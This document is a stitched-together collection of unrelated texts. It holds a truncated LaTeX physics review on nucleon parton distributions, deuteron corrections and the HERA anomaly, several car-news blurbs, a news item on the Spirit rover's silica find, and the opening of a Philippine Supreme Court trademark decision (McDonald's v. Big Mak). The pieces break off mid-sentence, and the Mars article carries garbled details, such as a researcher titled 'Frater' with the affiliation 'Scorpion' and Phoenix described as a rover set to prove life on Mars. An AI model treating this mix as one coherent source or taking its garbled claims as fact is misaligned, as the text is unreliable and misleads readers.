PQCD, suggest:\n\\begin{eqnarray}\n{ F_2^n \\over F_2^p }\n&\\rightarrow& {3 \\over 7}, \\ \\ \\ \\ \\\n{ d \\over u } \\rightarrow { 1 \\over 5 }\\ \\ \\ \\ \\\n; \\ \\ \\ \\ S_z=0\\ {\\rm dominance}.\n\\end{eqnarray}\nNote that the $d/u$ ratio {\\em does not vanish} in this case.\nClearly, if one is to understand the dynamics of the nucleon's quark\ndistributions at large $x$, it is imperative that the consequences of\nthese models be tested experimentally.\n\n\\section{Reanalysis of the experimental data at large-$x$}\n\nInformation on the structure functions of the neutron is obtained from\nthe analysis of deep-inelastic scattering data on the deuteron\n\\cite{WHIT,GOMEZ}.\nAmongst the many approaches to this problem we mention the light-front\ntreatment \\cite{FS,KU} and the relativistic impulse approximation\n\\cite{LG,BT}, involving the free nucleon structure function at a shifted\nvalue of $x$ or $Q^2$ \\cite{DT,NW}.\nA more phenomenological approach, developed by Frankfurt and Strikman\n\\cite{FS88}, attempts to derive the nuclear correction in the deuteron\nby extrapolation from higher $A$ as a function of the ``effective\ndensity''\nof the nucleus.\nThe experimental extraction of $F_2^n$ is usually made using either the\nphenomenological effective density approach or the older, ``pre-EMC''\ntheoretical treatments.\n\nWithin traditional nuclear physics the natural approach to the structure\nfunction of the deuteron is the impulse approximation.\nThis assumes a convolution of the free nucleon\nstructure function, $F_2^N$, with the non-relativistic momentum\ndistribution $f_{N/D}$ of nucleons in the deuteron, calculated\nin terms of a non-relativistic wave function of the deuteron and\nits binding energy.\nAlthough the binding energy is very small, the kinetic energy of the\nrecoiling nucleon plays a significant role in forcing the struck nucleon\nfurther off-shell than one would usually expect\\cite{DT}.\n\nIn order to assess the theoretical reliability of the non-relativistic\nimpulse approximation one needs to go beyond the usual assumptions made\nin the convolution approach \\cite{CONV}.\nIn particular, the ingredients necessary for a covariant, relativistic\ndescription are a covariant $DNN$ vertex with one of the nucleons\n(the spectator to the hard collision) on-mass-shell, and an off-shell\nphoton--nucleon scattering amplitude (``off-shell nucleon structure\nfunction'') $\\widehat W$, the full structure of which was only recently\nderived in Ref.\\cite{MST1}.\n\nThe analysis of Ref.\\cite{MST1} showed that the most general form of\nthe operator $\\widehat{W}$ (which is a $4\\times 4$ matrix in Dirac space),\nconsistent with the discrete symmetries and gauge invariance, which\ncontributes in the Bjorken limit is:\n\\begin{equation}\n\\widehat{W} = \\widehat{W}_0 I + \\widehat{W}_1 \\not\\!p + \\widehat{W}_2 \\not\\!q,\n\\label{3}\n\\end{equation}\nwhere the $\\widehat W_i$ are functions of $p^2, q^2$ and $p \\cdot q$\n($q$ is the virtual photon four-momentum).\nThus, whereas in the free case the nucleon structure function involves\nthe combination:\n\\begin{equation}\n{\\rm Tr}[(\\not\\!p + M) \\widehat{W}] \\sim M \\widehat{W}_0 + M^2 \\widehat{W}_1 + p \\cdot q\n\\widehat{W}_2,\n\\label{4}\n\\end{equation}\nthe deuteron structure function involves:\n\\begin{equation}\n{\\rm Tr}[(A_0 + \\gamma^\\mu A_{1 \\mu}) \\widehat{W}]\n\\sim A_0 \\widehat{W}_0 + p \\cdot A_1 \\widehat{W}_1 + q \\cdot A_1 \\widehat{W}_2.\n\\label{5}\n\\end{equation}\nClearly then, even in the absence of Fermi motion, one finds that\nin general $F_2^D \\neq F_2^N$.\n\nHaving established that, in principle, the structure function of the\nbound\nnucleon cannot equal the structure function of the free nucleon, the\nimportant question is how big the difference actually is in practice.\nTo estimate this, one can construct a simple model \\cite{MST1} of the\nso-called hand-bag diagram for an off-shell nucleon, in which the\n$N$-quark\nvertex is taken to be either a simple scalar or pseudo-vector, with the\nparameters adjusted to reproduce the free nucleon structure functions\n\\cite{MSM}.\n\nThe result of the fully off-shell calculation from Ref.\\cite{MST2}\nis shown in Fig.3 (solid curve), where the ratio of the total\ndeuteron to nucleon structure functions ($F_2^D/F_2^N$) is plotted.\n(We note that the behaviour of the full off-shell curve in Fig3.\nis qualitatively similar to that found by Uchiyama and Saito \\cite{US},\nKaptari and Umnikov\\cite{KU}, and Braun and Tokarev \\cite{BT}.)\nWe also show the result of an on-mass-shell calculation from\nRef.\\cite{FS} (dotted curve), which has been used in many previous\nanalyses of the deuteron data \\cite{EMC,WHIT}.\nThe most striking difference between the curves is the fact that the\non-shell ratio has a very much smaller trough at $x \\approx 0.3$, and\nrises faster above unity (at $x \\approx 0.5$) than the off-shell curve,\nwhich has a deeper trough, at $x \\approx 0.6-0.7$, and rises above unity\nsomewhat later (at $x \\approx 0.8$).\n\nClearly, a smaller $D/N$ ratio at large $x$, as in\nRefs.\\cite{MST1,MST2},\nimplies a larger neutron structure function in this region.\nTo estimate the size of the effect on the $n/p$ ratio requires one to\nextract $F_2^n$, while taking care to eliminate any effects  \nthat may arise from the extraction method itself.\nMelnitchouk and Thomas \\cite{MTNP} therefore used exactly the same\nextraction procedure as used in previous EMC \\cite{EMC} and SLAC\n\\cite{WHIT} data analyses, namely the smearing (or deconvolution)\nmethod discussed by Bodek {\\em et al.} \\cite{BODEK}.\n{\\em This method involves the direct use of the proton and deuteron\ndata, without making any assumption concerning $F_2^n$ itself}.\n\nThe results of this analysis are presented in Fig.4, using both the\noff-shell calculation \\cite{MST2} (solid points) and the on-shell model\n\\cite{FS} (open points).\nThe increase in the ratio at large $x$ for the off-shell case \nis a direct consequence\nof the deeper trough in the $F_2^D/F_2^N$ ratio in Fig.3.\nWe notice, in particular, that the values of $F_2^n/F_2^p$ \nobtained with the off-shell\nmethod appear to approach a value broadly consistent with the\nFarrar-Jackson \\cite{FJ} prediction of 3/7, whereas the data previously\nanalyzed in terms of the on-shell formalism produced a ratio tending to\nthe lower value of 1/4.\n\\begin{figure}[hbt]\n\\begin{center}\n\\epsfig{file=k4.ps,height=8cm}\n\\caption{Deconvoluted $F_2^n/F_2^p$ ratio extracted from the\n\tSLAC $p$ and $D$ data \\protect\\cite{WHIT,GOMEZ} using\n\t\tthe model of Ref.\\protect\\cite{MST1,MST2} (solid circles)\n\t\tand Ref.\\protect\\cite{FS} (open circles) -- from \n\t\tRef. \\protect\\cite{MTNP}.}\n\\end{center}\n\\end{figure}\n\nThe $d/u$ ratio, shown in Fig.5, is obtained by inverting $F_2^n/F_2^p$\nin the valence quark dominated region.\nThe points extracted using the off-shell formalism (solid circles) are\nagain significantly above those obtained previously with the aid of the\non-shell prescription.\nIn particular, they indicate that the $d/u$ ratio may actually approach\na {\\em finite} value in the $x \\rightarrow 1$ limit, contrary to the\nexpectation of the model of Refs.\\cite{CLO73,CAR75}, in which $d/u$\ntends to zero.\nAlthough it is {\\em a priori} not clear at which scale these model\npredictions should be valid, for the values of $Q^2$ corresponding\nto the analyzed data the effects of $Q^2$ evolution are minimal.\n\\begin{figure}[hbt]\n\\begin{center}\n\\epsfig{file=k5.ps,height=8cm}\n\\caption{The $d/u$ ratio extracted from the results of Fig.4.\n\tAlso shown for comparison is the ratio extracted from neutrino\n\t\tmeasurements by the CDHS collaboration \\protect\\cite{CDHS} and\n\t\t(dotted line) a standard linear fit.}\n\\end{center}\n\\end{figure}\n\nNaturally, it would be preferable to extract $F_2^n$ at large $x$\nwithout having to deal with uncertainties in the nuclear effects.\nIn principle this could be achieved by using neutrino and\nantineutrino beams to measure the $u$ and $d$ distributions in\nthe proton separately, and reconstructing $F_2^n$ from these.\nUnfortunately, as seen in Fig.5, the neutrino data \ndo not extend out to very large\n$x$ ($x > 0.6$), and at present cannot discriminate between\nthe different methods of analyzing the electron--deuteron data.\n\n\\section{The HERA Anomaly}\n\nThe H1 and ZEUS experiments at HERA have recently produced a small\nnumber of events at enormously high $Q^2$ which have generated\ntremendous theoretical interest \\cite{H1,ZEUS}.\nFor $Q^2 > 10,000 $GeV$^2$ and $x > 0.45$ the valence parton\ndistributions\nare calculated to drop dramatically.\nThe HERA anomaly is essentially the excess of observed ``neutral\ncurrent'' (NC) \nevents (i.e., events of the type $e^+ p \\rightarrow e^+ X$)\nover expectations by roughly\nan order of magnitude.\nMany exotic explanations of this excess have already been suggested,\nindeed,\nthe number of possibilities currently exceeds the number of events.\nHowever, before the new physics can be worked out one must be sure that\nthe\ninput parton distributions used to estimate ``background'' rates are\nreliable.\n\nOne glaring problem with the current treatment of the partonic\n``background'' is that {\\em all} of the standard distributions used are\nconstructed to satisfy $d/u \\rightarrow 0$ as $x \\rightarrow 1$ at low-$Q^2$.\nAs we have seen, the recent re-analysis of the deuteron data leads to a\n$d/u$ ratio which appears to be consistent with the prediction of PQCD\nthat $d/u \\rightarrow 1/5$ as $x \\rightarrow 1$.\nIn the light of this result it is not only vital to find alternative,\nmore direct measurements of $d/u$ at large $x$, but those generating\nstandard sets of parton distributions should at the very least present\nalternative parameter sets consistent with the new analysis of the\ndeuteron data.\nUntil parameter sets are constructed which are consistent with\n$d/u \\rightarrow 1/5$ as $x \\rightarrow 1$, at $Q^2 \\sim 10$ GeV$^2$, one cannot be\nsure of the reliability of ``background'' rate estimates at the extreme\nvalues of $Q^2$ and $x$ being probed at HERA.\n\n\\begin{figure}[htb]\n\\begin{center}\n\\epsfig{file=k6.ps,height=8cm}\n\\caption{Ratio of modified to standard DIS model NC cross sections\n\tat the charm threshold (from Ref.

What one needs, therefore,\nis a substantially harder distribution which\nhas significantly more strength above $x \\sim 0.6$ than in Eq.(\\ref{delic}).\nThis was precisely what was found in the non-perturbative calculation of\nMelnitchouk and Thomas \\cite{MT_HERA}  -- see Fig.2 above.\n\nThe calculation of the NC and CC cross sections requires parton distributions\nfor all flavors.\nFor this we use a recent parameterization of global data from the CTEQ\nCollaboration \\cite{CTEQ}.\nExpressions for the differential NC and CC cross sections $d^2\\sigma/dxdQ^2$\nin the standard model can be found in Refs.\\cite{ZEUS} and \\cite{H196}.\nIn Fig.6 we show the ratios of the modified to standard DIS model NC\ncross sections, with $\\sigma \\equiv d^2\\sigma/dxdQ^2$, and \n$\\sigma + \\delta\\sigma$\nrepresents the cross section calculated with the modified distributions.\nThe result with the modified $u$ distribution \\cite{KLT}, which was\nrather artificially created to reproduce the HERA anomaly, rises sharply\nabove $M \\sim 200$ GeV.\nThe effect is rather similar if one includes the non-perturbative $\\delta c$\nand $\\delta \\overline c$ distributions from the meson cloud model.\nOn the other hand, with the somewhat softer, intrinsic charm distribution\nof Refs. \\cite{GV,BHPS}, the enhancement is rather modest, and less than about\n10\\% over the whole range of $M$.\n\\begin{figure}[htb]\n\\begin{center}\n\\epsfig{file=k7.ps,height=8cm}\n\\caption{Ratio of modified to standard DIS model CC cross sections at\n$Q^2=20000$~GeV$^2$, with the modifications arising from\n0.5\\% and 1\\% additional $\\delta \\overline c$ distributions,\nas well as a modified $d$ quark distribution at large $x$\n-- from Ref. \\protect\\cite{MT_HERA}.}\n\\end{center}\n\\end{figure}\n\nWe also show the effect of additional contributions to the light\nflavor distributions ($u, \\overline u, d$ and $\\overline d$) which one would\nobtain from the pion cloud of the nucleon.\nAlthough these are considerably larger in magnitude than the $\\delta c$\nor $\\delta \\overline c$ distributions, because they appear at small $x$\n($\\sim 0.1$) their effect is to yield only a very small enhancement of \nthe cross section ratio.\n{}From this figure one can conclude that the only realistic candidates\nfor a significant enhancement of the cross section at large $M$ are the\nmodified valence $u$ distribution from Ref.\\cite{KLT}, and the hard charm\ndistributions in Eq.(\\ref{mcm_final}).\n\nFor scattering via the CC, the effect of the additional contributions to\nthe parton distributions is shown in Fig.7 for $Q^2 = 20000$~GeV$^2$.\nSince the $W^+$ boson is not sensitive to the $u$ quark in the proton,\nthe $\\delta u$ modification has no effect on the $e^+ p$ cross section.\nIn contrast, as noted by Babu {\\it et al.} \\cite{BABU}, the effect of\nan additional non-perturbative $\\delta \\overline c$ contribution is an\neven larger enhancement of the CC cross section than the NC cross section.\nWith a 0.5\\% (1\\%) intrinsic charm component the CC cross section\nincreases by a factor $\\sim$ 2 (3) for $200 < M < 250$~GeV,\nwhich is similar to the excess observed by H1 \\cite{H1} in this region.\n\n\\section{Spin Dependent Structure Functions}\n\nThe spin structure functions of the nucleon, $g_1^{p(n)}$, are of\ntremendous interest at present.\nExperimentally, $g_1$ is proportional to the difference of DIS cross\nsections for $ep$ scattering with beam and target helicities aligned\nand anti-aligned \\cite{CHENG}. \nWithin the parton model it may be written in terms of the parton helicity \n(loosely ``spin'') distributions,\n$\\Delta q(x) = [q^{\\uparrow} - q^{\\downarrow}\n\t       + \\bar{q}^{\\uparrow} - \\bar{q}^{\\downarrow}]$,\nwith $q^{\\uparrow (\\downarrow)}$ the number density of quarks with\nhelicity parallel (anti-parallel) to the helicity of the target proton:\n\\begin{equation}\ng_1^p(x) = \\frac{1}{2} \\sum_q e^2_q \\Delta q(x).\n\\label{eq:3.1}\n\\end{equation}\n\nIntense interest in the spin structure functions began in 1988 when EMC\nannounced a large violation of the Ellis-Jaffe sum rule \\cite{EMC_SPIN}, \nwhich relates $\\Gamma_p(Q^2) \\equiv \\int^1_0 g_1^p(x,Q^2) dx$ to the\nisovector and octet axial-vector coupling constants, $g_A^{(3)}$ and\n$g_A^{(8)}$.\nThe failure of this sum rule, which is not a rigorous consequence of QCD,\nled to questions about the Bjorken sum rule, which relates\n$\\Gamma_p - \\Gamma_n$ to $g_A^{(3)}/6$ (modulo QCD radiative corrections\n\\cite{VER}) and {\\em is} a strict consequence of QCD.\nTo determine $\\Gamma_n$ one must measure $g_1^n(x)$, which requires a\npolarized nuclear target such as $^3$He or D.\nAt present, all neutron data extracted from the deuteron are obtained\nby applying a simple, non-relativistic prescription to correct $g_1^D$ \nfor the $D$-state component (probability $\\omega_D$) of the deuteron\nwave function \\cite{DPOL}:\n\\begin{equation}\ng_1^n(x)\n= \\left(1 - \\frac{3}{2} \\omega_D\\right)^{-1} g_1^D(x) - g_1^p(x).\n\\label{eq:3.3}\n\\end{equation}\nAs we explain below, exactly the same techniques described in \nsection 5 may be used to test the accuracy of Eq.(\\ref{eq:3.3}).\n\nWhile most interest has been focussed on the issue of sum rules,\nwe stress that the shapes of $g_1^p(x)$ and $g_1^n(x)$ contain even\nmore important information.\nFor example, the same arguments that led to different conclusions\nabout the behaviour of $d/u$ as $x \\rightarrow 1$ also give quite different \npredictions for $g_1^p$ and $g_1^n$ as $x \\rightarrow 1$, namely 1/4\nand 3/7, respectively.\nQuite interestingly, while the ratio of the \npolarized to unpolarized $u$\nquark distributions is predicted to be the same in the two models:\n\\begin{eqnarray}\n\\label{Deltau}\n{ \\Delta u \\over u }\n&\\rightarrow& 1\\ \\ \\ \\ ; \\ \\ \\ \\ S=0\\ or\\ S_z=0\\ {\\rm dominance},\n\\end{eqnarray}\nthe results for the $d$-quark distribution ratio differ even in sign:\n\\begin{eqnarray}\n{ \\Delta d \\over d }\n&\\rightarrow& - {1 \\over 3}\\ \\ \\ \\ ; \\ \\ \\ \\ S=0\\ {\\rm dominance},\\\\\n&\\rightarrow& 1\\ \\ \\ \\ ; \\ \\ \\ \\ S_z=0\\ {\\rm dominance}.\n\\label{Deltad}\n\\end{eqnarray}\n\nUsing the same techniques described earlier for the\nunpolarized case, Melnitchouk, Piller and Thomas \\cite{MPT} derived the\nmost general, antisymmetric, Dirac tensor operator of twist 2 for an\noff-mass-shell nucleon (see also \\cite{KMPW}):\n\\begin{equation}\n\\widehat{G}^{\\mu\\nu} = i \\epsilon^{\\mu\\nu\\alpha\\beta} q_{\\alpha}\n\\left[ p_\\beta ( \\not\\!p \\gamma_5 \\widehat G_p\n\t       + \\not\\!q \\gamma_5 \\widehat G_q )\n     + \\gamma_\\beta \\gamma_5 \\widehat G_\\gamma \n\\right].\n\\end{equation}\nOnce again, one finds that three functions, $\\widehat G_i$, can be\nconstructed in terms of scalar and pseudo-scalar vertices.\nHowever, in this case there is a new feature, {\\em the function\n$\\widehat G_p$ does not contribute for a free nucleon}, whereas it\ndoes contribute in a nucleus.\n\\begin{figure}[hbt]\n\\begin{center}\n\\epsfig{file=k8.ps,height=7cm}\n\\caption{Ratio of deuteron and nucleon structure functions in the\n\tfull model (solid), and with a constant depolarization factor\n\tcorresponding to $\\omega_D = 4.7\\%$ (dotted line).\n\tThe dashed curve is the ratio of $g_1^D$ calculated via\n\tconvolution to $g_1^D$ calculated in the relativistic model\n\t--- from Ref.\\protect\\cite{MPT}.}\n\\end{center}\n\\end{figure}\n\nThe spin-dependent deuteron structure function is given by the trace of\n$\\widehat{G}^{\\mu\\nu}$ with a spin-dependent $ND$ amplitude \\cite{MPT},\nwhich can be evaluated using the relativistic $DNN$ vertex of Ref.\\cite{BG}.\nSurprisingly, Fig.8 shows that the ratio of the convolution approximation\nto the fully off-shell calculation (the dashed curve) is even closer to\nunity in this case than in the spin-independent case.\n\nThe comparison between the solid and dotted curves in Fig.8 shows that\nEq.(\\ref{eq:3.3}) is reliable at the 2\\% level for $x$ below 0.7.\nHowever, the excellent agreement in this region between (\\ref{eq:3.3})\nand the full calculation relies on a knowledge of the deuteron $D$-state\nprobability.\nAs shown in Ref.\\cite{MPT}, a change of $\\omega_D$ by 2\\% (e.g. from 4\\%\nto 6\\%) leads to an error of order 10\\% or more in $g_1^n$.\nFor $x > 0.7$, on the other hand, the approximation (\\ref{eq:3.3})\nfails dramatically.\nThis will be extremely important when testing the predictions of PQCD\nfor the $x \\rightarrow 1$ behavior of the polarized distributions in\nEqs.(\\ref{Deltau})--(\\ref{Deltad}).\n\n\\section{Conclusions}\n\nAs we have seen, there is now overwhelming experimental evidence for a\nlarge, non-perturbative component of the non-strange sea of the nucleon.\nThis is almost certainly associated with the pion cloud of the nucleon.\nA full, quantitative analysis of the relevant data, especially the\nDrell-Yan data from FNAL, will provide important new insight into the\nprocess of dynamical symmetry breaking in QCD. \n\nHaving seen the importance of the non-perturbative component of the\nnon-strange sea, it is natural to ask about the strange and even the\ncharm sea. For the former there is, as yet, no evidence for an asymmetry\nbetween $s$ and $\\overline s$ quarks -- although there are limits on how\nbig it could be. On the other hand, in the case of charm there is\ntremendous interest in a possible non-perturbative component -- the\nintrinsic charm sea. Amongst other things this is important for the\ninterpretation of the anomaly at high invariant mass observed recently\nat HERA. From the theoretical point of view it is a totally open\nquestion whether or not there is an intrinsic charm sea and, if so,\nwhether or not it is asymmetric.\n\nThe large-$x$ region of the parton distributions corresponds to the high\nmomentum components of the nucleon wave function. It is a vital question\nfor our understanding of hadron structure just how these high momentum\ncomponents are generated. We have seen that the most recent analysis of\nthe structure function of the deuteron strongly supports the suggestion\nthat these high momentum components are generated by gluon final state\ninteractions which can be understood in terms of perturbative QCD. As a\nconsequence the valence $d/u$ ratio seems not to vanish as $x \\rightarrow 1$.\nThis idea needs further testing but certainly has important consequences\nfor event rates at machines like HERA.\n\nOur new understanding of the unpolarized parton distributions at\nlarge-$x$ also leads us to new expectations for the polarized\ndistributions -- especially for the polarized neutron. The extraction of\nthis information using a bound neutron target requires a sophisticated\nunderstanding of off-shell corrections in nuclear deep-inelastic\nscattering. \n\n\\section*{Acknowledgments}\nIt is a pleasure to acknowledge the contributions to the work described\nhere by W.

Some 77 years after it was originally conceived, a completed Bugatti 100P airplane will see the light of day at the Mullin Automotive Museum in Oxnard, California as a part of the Art of Bugatti Exhibit. Designed to reach speeds of nearly 500 mph, the beautiful and technologically advanced 100P was a collaboration between Ettore Bugatti and Belgian engineer Louis de Monge. Development of the 100P began in 1937 but World War II and the advancing German army forced Bugatti to put the plane into hiding in 1940.\nThe public will have the chance to view this Art Deco-style airplane and its technological marvels beginning March 20. The compact and light 100P features mid-mounted twin 450-hp engines powering counter-rotating propellers, allowing speeds only achieved at that time by planes with twice the horsepower. The forward-pitched wings and zero drag cooling system predate many of the most advanced military aircraft of the era. Most interestingly, the plane also features an automatic flap adjustment system utilizing an advanced analog computer, that sets the flaps according to air pressure, throttle, and air speed.

The completion of the 100P represents a highlight of the storied career of Ettore Bugatti, whose vehicles represented the pinnacle of prewar design and technology. Now, if only we could arrange a comparison test between a Veyron Super Sport and the 100P.\nThu Nov 14 2013 17:36:31 GMT+0000 (Coordinated Universal Time)\nGail Wise bought her Mustang on April 15, 1964, for $3,447.50.

He had none on the floor, but he invited me into the back room, where he had a baby blue convertible under a tarp. And there it was.\nI had never heard of the Mustang. It hadn't been launched yet, but they let me drive it out of the showroom that night. Everyone stared at me. I felt like a movie star!

It stayed there until 2006, when he fully restored it. A year later, Tom was reading a story about a Mustang purchased the day after I bought mine; that owner claimed to be the first buyer. This summer we brought the Mustang to a car show in Dearborn, Mich., where we met some Ford executives. The car was a hit, and that was the beginning of Ford recognizing us as owners of the first Mustang ever sold.

Stay tuned.\nCaterham, the British sports car maker famous for lightweight track cars, has just released a new car called the Caterham AeroSeven Concept. This uniquely styled track car is apparently going to become a production sports car that will go on sale in the fall of 2014, according to a statement from Caterham.\nThe basis for this car is the legendary Caterham Seven, as the AeroSeven Concept uses a modified version of the Seven's platform as well as the same 237 hp, 2.0-liter Ford four-cylinder engine that's currently offered in the Caterham Seven 485. The body of the Caterham AeroSeven Concept is made of carbon fiber, making for an extremely light curb weight. Although 237 hp may not sound like a lot, this light weight means the Caterham AeroSeven Concept can go from 0-62 mph in under four seconds.\nThe styling of the Caterham AeroSeven Concept looks like a modern, futuristic version of the Seven, with the same long hood and low-slung profile but a much sleeker, aerodynamic front end design compared with the blocky Seven. Caterham says the new bodywork improves the drag coefficient significantly. On the inside, there is a new high-resolution center-mounted display that shows all instrumentation in a 3-D rendering. The steering wheel hasbuttons for different modes, including default Race mode in addition to Road mode and specific modes like a speed-limited mode for the pit lane. It even has traction control, a first for any Caterham model.\nThe production version of the Caterham AeroSeven Concept will be built at the Caterham factory in the U.K., and Caterham says this is the first car in a series of new models from Caterham over the next few years. In a separate release, Caterham detailed its plans for the future which includes expansion thanks to a new partnership with Renault. We've previously reported on this joint venture, and one of the upcoming projects is a sports car for the revived Alpine brand that is due in 2016. Caterham co-chairman Tony Fernandes even said a crossover and a city car could be in Caterham's pipeline to accompany the broader range of sports cars. Fernandes did not make any sales projections, but we're interested to see how Caterham's expansion plays out.\nIn the meantime, check out the gallery below for more images of the Caterham AeroSeven Concept.\nTue Jul 02 2013 00:41:48 GMT+0000 (Coordinated Universal Time)\nU.S. investigating brake problem with some Honda Odysseys.\nThe U.S. National Highway Traffic Safety Administration is investigating a potential braking issue with Honda Motor Co's (7267.T) Honda Odyssey minivans that could cause them to brake without the driver touching the brake pedal.\nEarlier this week, the vehicle safety arm of the U.S. Department of Transportation said it was opening an investigation of the issue, which could affect nearly 344,000 vans from the 2007 and 2008 model years.\nAccording to a report on the administration's website, the agency has received 22 complaints alleging incidents of unexpected braking, including some complaints in which the car suddenly brakes by itself while the driver is accelerating, causing the car speed to quickly fall by as much as 30 miles per hour.\nSo far, there have not been any crashes or injuries attributed to the problems, which appear to be related to the car's vehicle stability assist system, a safety feature that automatically applies the brakes on sharp turns or when the car is accelerating on loose or slippery surfaces.\nA Honda spokeswoman was not immediately available for comment.\nIn March, Honda recalled nearly 250,000 vehicles globally due to similar braking problems. In the United States, the recalls affected the Acura RL sedan, Acura MDX crossover SUV and the Honda Pilot SUV, but in Japan, the recall included the Legend sedan and three types of minivans, including the Odyssey.\nMost of those vehicles were made between 2004 and 2005.\nAs with the current issues seen in the Odyssey, the issue involved the vehicle stability assist system, which in some cases could malfunction and apply the brake even when the driver was not pressing the brake pedal.\nReporting by Julie Steenhuysen; Editing by Eric Walsh.

{"text": "ITHACA, New York - NASA's Spirit mission may hold the key to proving that life on Mars is not just wishful thinking. The patch of silica-rich soil accidentally uncovered by the rover last year had a major impact on the scientific community, who started asking one question: was that a sign that past life on Mars was ever possible?\nIn a study recently published in the journal Science, a team of researchers led by Frater Steven Squyres (Scorpion, Cornell Univ.) explained that the hot springs, which are believed to have played an important role in forming the silica layer, could indicate possible forms of life.\nBy comparison with Earth, such deposits, usually associated with hot springs and other forms of volcanic activities, contain fossil remains of microbes, Jack Farmer, professor of astrobiology in Arizona State University's School of Earth and Space Exploration, and co-author of the study, explained.\nHowever, it remains hard to tell whether that could be the case on Mars, considering that the Spirit rover doesn't carry the adequate instruments to probe that. But, Farmer added, what scientists can say is that this environment, once rich in liquid water and energy needed for life, was at some point a habitable environment.\nLast year, Frater Squyres said that whether the water came from a hot-spring, similar to a geyser, or from a fumarole in which acidic streams rose through the cracks, the concentration of silica is the most significant discovery by Spirit for revealing a habitable niche that existed on Mars in the past.\nScientists still oscillate between the two possible origins of water on Mars, and some even said that the deposits found have a great level of titanium, which is often encountered in Earth's fumarolic deposits, indicating that water may have originated from fumaroles.\nThe Spirit Mission, originally planned for 90 Martian Days of surveillance, has gathered over four years on the Red Planet. The next Martian mission, with the next generation of rover - Phoenix, is expected to prove that life on Mars is not just a myth. The Mars Rover landed on May 25, in the northernmost point studied to date. Frater Squyres is very excited about the data they could collect from this mission.\nAdapted from eFluxMedia News Article.

{"text": "G. R. No. 143993 - August 18, 2004\nMCDONALD'S CORPORATION and MCGEORGE FOOD INDUSTRIES, INC., Petitioners, vs. L.C. BIG MAK BURGER, INC., FRANCIS B. DY, EDNA A. DY, RENE B. DY, WILLIAM B. DY, JESUS AYCARDO, ARACELI AYCARDO, and GRACE HUERTO, Respondents.\nD E C I S I O N\nCARPIO, J.:\nThis is a petition for review1 of the Decision dated 26 November 1999 of the Court of Appeals2 finding respondent L.C. Big Mak Burger, Inc. not liable for trademark infringement and unfair competition and ordering petitioners to pay respondents P1,900,000 in damages, and of its Resolution dated 11 July 2000 denying reconsideration. The Court of Appeals' Decision reversed the 5 September 1994 Decision3 of the Regional Trial Court of Makati, Branch 137, finding respondent L.C. Big Mak Burger, Inc. liable for trademark infringement and unfair competition.\nPetitioner McDonald's Corporation (\"McDonald's\") is a corporation organized under the laws of Delaware, United States. McDonald's operates, by itself or through its franchisees, a global chain of fast-food restaurants. McDonald's4 owns a family of marks5 including the \"Big Mac\" mark for its \"double-decker hamburger sandwich.\"6 McDonald's registered this trademark with the United States Trademark Registry on 16 October 1979.7 Based on this Home Registration, McDonald's applied for the registration of the same mark in the Principal Register of the then Philippine Bureau of Patents, Trademarks and Technology (\"PBPTT\"), now the Intellectual Property Office (\"IPO\"). Pending approval of its application, McDonald's introduced its \"Big Mac\" hamburger sandwiches in the Philippine market in September 1981. On 18 July 1985, the PBPTT allowed registration of the \"Big Mac\" mark in the Principal Register based on its Home Registration in the United States.\nLike its other marks, McDonald's displays the \"Big Mac\" mark in items8 and paraphernalia9 in its restaurants, and in its outdoor and indoor signages. From 1982 to 1990, McDonald's spent P10.5 million in advertisement for \"Big Mac\" hamburger sandwiches alone.10\nPetitioner McGeorge Food Industries (\"petitioner McGeorge\"), a domestic corporation, is McDonald's Philippine franchisee.11\nRespondent L.C. Big Mak Burger, Inc. (\"respondent corporation\") is a domestic corporation which operates fast-food outlets and snack vans in Metro Manila and nearby provinces.12 Respondent corporation's menu includes hamburger sandwiches and other food items.13 Respondents Francis B. Dy, Edna A. Dy, Rene B. Dy, William B. Dy, Jesus Aycardo, Araceli Aycardo, and Grace Huerto (\"private respondents\") are the incorporators, stockholders and directors of respondent corporation.14\nOn 21 October 1988, respondent corporation applied with the PBPTT for the registration of the \"Big Mak\" mark for its hamburger sandwiches. McDonald's opposed respondent corporation's application on the ground that \"Big Mak\" was a colorable imitation of its registered \"Big Mac\" mark for the same food products. McDonald's also informed respondent Francis Dy (\"respondent Dy\"), the chairman of the Board of Directors of respondent corporation, of its exclusive right to the \"Big Mac\" mark and requested him to desist from using the \"Big Mac\" mark or any similar mark.\nHaving received no reply from respondent Dy, petitioners on 6 June 1990 sued respondents in the Regional Trial Court of Makati, Branch 137 (\"RTC\"), for trademark infringement and unfair competition. In its Order of 11 July 1990, the RTC issued a temporary restraining order (\"TRO\") against respondents enjoining them from using the \"Big Mak\" mark in the operation of their business in the National Capital Region.15 On 16 August 1990, the RTC issued a writ of preliminary injunction replacing the TRO.16\nIn their Answer, respondents admitted that they have been using the name \"Big Mak Burger\" for their fast-food business. Respondents claimed, however, that McDonald's does not have an exclusive right to the \"Big Mac\" mark or to any other similar mark. Respondents point out that the Isaiyas Group of Corporations (\"Isaiyas Group\") registered the same mark for hamburger sandwiches with the PBPTT on 31 March 1979. One Rodolfo Topacio (\"Topacio\") similarly registered the same mark on 24 June 1983, prior to McDonald's registration on 18 July 1985. Alternatively, respondents claimed that they are not liable for trademark infringement or for unfair competition, as the \"Big Mak\" mark they sought to register does not constitute a colorable imitation of the \"Big Mac\" mark. Respondents asserted that they did not fraudulently pass off their hamburger sandwiches as those of petitioners' Big Mac hamburgers.17 Respondents sought damages in their counterclaim.\nIn their Reply, petitioners denied respondents' claim that McDonald's is not the exclusive owner of the \"Big Mac\" mark. Petitioners asserted that while the Isaiyas Group and Topacio did register the \"Big Mac\" mark ahead of McDonald's, the Isaiyas Group did so only in the Supplemental Register of the PBPTT and such registration does not provide any protection. McDonald's disclosed that it had acquired Topacio's rights to his registration in a Deed of Assignment dated 18 May 1981.18\nThe Trial Court's Ruling\nOn 5 September 1994, the RTC rendered judgment (\"RTC Decision\") finding respondent corporation liable for trademark infringement and unfair competition. However, the RTC dismissed the complaint against private respondents and the counterclaim against petitioners for lack of merit and insufficiency of evidence. The RTC held:\nUndeniably, the mark \"B[ig] M[ac]\" is a registered trademark for plaintiff McDonald's, and as such, it is entitled [to] protection against infringement.\nThere exist some distinctions between the names \"B[ig] M[ac]\" and \"B[ig] M[ak]\" as appearing in the respective signages, wrappers and containers of the food products of the parties. But infringement goes beyond the physical features of the questioned name and the original name. There are still other factors to be considered.\nSignificantly, the contending parties are both in the business of fast-food chains and restaurants. An average person who is hungry and wants to eat a hamburger sandwich may not be discriminating enough to look for a McDonald's restaurant and buy a \"B[ig] M[ac]\" hamburger. Once he sees a stall selling hamburger sandwich, in all likelihood, he will dip into his pocket and order a \"B[ig] M[ak]\" 